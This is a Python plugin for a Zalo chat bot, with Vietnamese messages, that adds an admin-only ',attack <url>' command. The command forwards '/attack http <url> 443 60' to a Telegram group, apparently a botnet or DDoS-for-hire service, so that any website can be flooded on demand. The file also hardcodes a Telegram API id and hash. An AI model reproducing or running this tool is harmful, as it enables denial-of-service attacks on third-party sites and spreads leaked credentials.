import asyncio
from zlapi.models import Message
from config import ADMIN
from telethon import TelegramClient
import time
from datetime import datetime


api_id ='22234763'
api_hash = '0526afc7b20d8d70628c0aea2fd40a74'
group_username = '@thinhdzzie'

ADMIN_ID = '841772837717522604'

des = {
    'version': "1.0.1",
    'credits': "TRBAYK (NGSON)",
    'description': "Telegram"
}

def is_admin(author_id):
    return author_id == ADMIN_ID

async def send_message(client_telegram, message):
    await client_telegram.send_message(group_username, message)

def handle_attack_command(message, message_object, thread_id, thread_type, author_id, client):
    if not is_admin(author_id):
        msg = "MÀY KHÔNG CÓ QUYỀN 😺"
        client.replyMessage(Message(text=msg), message_object, thread_id, thread_type,ttl=40000)
        return

    parts = message.split()
    
    if len(parts) > 1 and parts[0].lower() == ",attack ":
        url = parts[1]  
        attack_command = f"/attack http {url} 443 60"
        
        try:
            client_telegram = TelegramClient('session_name', api_id, api_hash)
            client_telegram.start()
            asyncio.run(send_message(client_telegram, attack_command))

            success_message = f"Đã gửi lệnh: {attack_command} vào nhóm Telegram."
            client.replyMessage(Message(text=success_message), message_object, thread_id, thread_type,ttl=40000)
        except Exception as e:
            error_message = f"Lỗi khi gửi tin nhắn đến Telegram: {str(e)}"
            client.send(Message(text=error_message), thread_id, thread_type,ttl=40000)
    else:
        msg = "Cú pháp không hợp lệ! Vui lòng sử dụng: attack <url>."
        client.replyMessage(Message(text=msg), message_object, thread_id, thread_type,ttl=40000)

def get_mitaizl():
    return {
        'attack': handle_attack_command  
    }